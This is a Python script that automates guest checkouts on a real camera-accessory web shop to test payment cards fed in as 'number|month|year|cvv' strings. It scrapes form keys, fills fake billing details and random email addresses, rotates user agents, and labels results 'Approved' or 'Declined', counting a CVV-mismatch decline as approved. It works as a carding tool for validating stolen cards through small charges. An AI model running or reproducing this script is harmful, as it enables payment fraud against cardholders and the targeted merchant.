import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent
def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

class Autocomplet:
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    def cut_str(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = Autocomplet().cut_str(self._tokenEncoding, '"authorizationFingerprint":"', '","')

        return self.bear_end

@dataclass
class pafiw:
    def __init__(self, card):


        self.card = card
        self.ccs = card.split('|')
        if self.ccs[0].startswith("4"): self.brand = "VI"
        if self.ccs[0].startswith("3"): self.brand = "AE"
        elif self.ccs[0].startswith("5"): self.brand = "MC"
        session = requests.Session()

    def main(self):
        try:
            session = Session()
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random

            #self.session.proxies = proxies
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Referer': 'https://www.feisol.net/accessories.html?dir=asc&order=price',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': Agent,
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            response = session.get('https://www.feisol.net/accessories/feisol-bubble-level-bl-hs1.html', headers=headers).text
            key1 = paserX(response, 'name="form_key" type="hidden" value="', '"')
            print(key1)
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.feisol.net',
                'Referer': 'https://www.feisol.net/accessories/feisol-bubble-level-bl-hs1.html',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': Agent,
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            data = {
                'form_key': key1,
                'product': '240',
                'related_product': '',
                'qty': '1',
                'return_url': '',
            }
            response = session.post(
                'https://www.feisol.net/checkout/cart/add/',
                headers=headers,
                data=data
            )
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Referer': 'https://www.feisol.net/accessories/feisol-bubble-level-bl-hs1.html',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': Agent,
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            response = session.get('https://www.feisol.net/checkout/cart/',  headers=headers).text
            fromkey2 = paserX(response, 'name="form_key" type="hidden" value="', '"')
            print(fromkey2)
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Connection': 'keep-alive',
                'Referer': 'https://www.feisol.net/checkout/cart/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': Agent,
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            response = session.get('https://www.feisol.net/checkout/onepage/', headers=headers)
            headers = {
                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Connection': 'keep-alive',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.feisol.net',
                'Referer': 'https://www.feisol.net/checkout/onepage/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': Agent,
                'X-Prototype-Version': '1.7',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            data = {
                'method': 'guest',
            }

            response = session.post('https://www.feisol.net/checkout/onepage/saveMethod/', headers=headers, data=data)
            headers = {
                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Connection': 'keep-alive',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.feisol.net',
                'Referer': 'https://www.feisol.net/checkout/onepage/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': Agent,
                'X-Prototype-Version': '1.7',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            data = {
                'billing[address_id]': '',
                'billing[firstname]': 'ldfl',
                'billing[lastname]': 'dsdasd',
                'billing[company]': 'ggd',
                'billing[email]': CorreoRand,
                'billing[street][]': [
                    'moall del sol',
                    'sadw',
                ],
                'billing[city]': 'guayas',
                'billing[region_id]': '43',
                'billing[region]': '',
                'billing[postcode]': '10080',
                'billing[country_id]': 'US',
                'billing[telephone]': '0989861371',
                'billing[fax]': '0989861371',
                'billing[customer_password]': '',
                'billing[confirm_password]': '',
                'billing[save_in_address_book]': '1',
                'billing[use_for_shipping]': '1',
                'form_key': fromkey2,
            }

            response = session.post('https://www.feisol.net/checkout/onepage/saveBilling/',  headers=headers, data=data)

            headers = {
                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Connection': 'keep-alive',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.feisol.net',
                'Referer': 'https://www.feisol.net/checkout/onepage/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': Agent,
                'X-Prototype-Version': '1.7',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            data = {
                'shipping_method': 'tablerate_bestway',
                'form_key': fromkey2,
            }

            response = session.post(
                'https://www.feisol.net/checkout/onepage/saveShippingMethod/',
                headers=headers,
                data=data,
            )
            headers = {
                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Connection': 'keep-alive',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.feisol.net',
                'Referer': 'https://www.feisol.net/checkout/onepage/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': Agent,
                'X-Prototype-Version': '1.7',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            data = {
                'payment[method]': 'paypal_direct',
                'payment[cc_type]': self.brand,
                'payment[cc_number]': self.ccs[0],
                'payment[cc_exp_month]': self.ccs[1],
                'payment[cc_exp_year]': self.ccs[2],
                'payment[cc_cid]': self.ccs[3],
                'form_key': fromkey2,
            }

            response = session.post('https://www.feisol.net/checkout/onepage/savePayment/', headers=headers, data=data)

            headers = {
                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'Accept-Language': 'es-ES,es;q=0.7',
                'Connection': 'keep-alive',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.feisol.net',
                'Referer': 'https://www.feisol.net/checkout/onepage/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent':Agent,
                'X-Prototype-Version': '1.7',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
            }

            data = {
                'payment[method]': 'paypal_direct',
                'payment[cc_type]': self.brand,
                'payment[cc_number]': self.ccs[0],
                'payment[cc_exp_month]': self.ccs[1],
                'payment[cc_exp_year]': self.ccs[2],
                'payment[cc_cid]': self.ccs[3],
                'form_key': fromkey2,
                'cdr_ordercomment': '',
            }

            response = session.post(
                f'https://www.feisol.net/checkout/onepage/saveOrder/form_key/{fromkey2}/',
                headers=headers,
                data=data,
            )
            data = response.json()
            err = data.get("error_messages")
            
            # payflow woo 18.08
            if data.get("success") is True:
                return 'Approved! ✅', 'Charged 10.85'


            elif 'PayPal gateway has rejected request. This transaction cannot be processed. Please enter a valid Credit Card Verification Number (#15004: Gateway Decline)' in str(err):
                return 'Approved! ✅', err

            else:
                return 'Declined ❌', err

        except Exception as e:
            print(e)
            return 'Declined ❌', str(e)
